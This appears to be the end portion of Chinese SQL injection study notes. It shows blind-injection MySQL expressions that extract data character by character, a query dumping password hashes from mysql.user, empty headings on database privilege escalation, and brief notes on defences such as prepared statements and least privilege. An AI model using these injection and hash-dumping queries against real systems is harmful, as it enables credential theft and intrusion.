@@user ==> user()
@@datadir ==> datadir()
substr((select ‘password’),1,1) = 0x70
strcmp(left(‘password’,1), 0x69) = 1
strcmp(left(‘password’,1), 0x70) = 0
strcmp(left(‘password’,1), 0x71) = -1
```





### 4.12 MYSQL HASH获取与解密

https://www.sqlsec.com/2020/11/mysql.html#Hash-%E8%8E%B7%E5%8F%96%E4%B8%8E%E8%A7%A3%E5%AF%86

对authentication_string解密后即可得到密码。

```mysql
select host,user,authentication_string from mysql.user;
+-----------+---------------+-------------------------------------------+
| host      | user          | authentication_string                     |
+-----------+---------------+-------------------------------------------+
| localhost | root          | *8232A1298A49F710DBEE0B330C42EEC825D4190A |
| localhost | mysql.session | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |
| localhost | mysql.sys     | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |
+-----------+---------------+-------------------------------------------+
```





## 7. 数据库提权



### 7.1 UDF提权





### 7.2 MOF提权





### 7.3









## 7. SQL注入的危害





## 8. SQL注入的防御措施



（1）预编译（prepared statement）

+ 参数化查询

用户输入的内容不会直接被拼接到sql语句中，而是作为参数传递给预编译语句。



+ 语句预编译



+ 参数值转义

对参数里的特殊字符进行转义，确保用户输入的内容不会被解析为sql控制字符。



（2）ORM框架

ORM指对象关系映射。



（3）输入验证与过滤



（4）数据库最小权限分配





## 参考文献

[生命在于学习——SQL注入绕过](https://blog.csdn.net/qq_15131581/article/details/126378328)

[浅谈Sql注入总结笔记整理](https://www.freebuf.com/articles/web/339118.html)

[[SQL注入有趣姿势总结](https://www.cnblogs.com/linuxsec/articles/11107102.html)]



![在这里插入图片描述](https://img-blog.csdnimg.cn/8625d8ec44d340228e5b6664f69e2f99.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAT2NlYW5TZWM=,size_20,color_FFFFFF,t_70,g_se,x_16)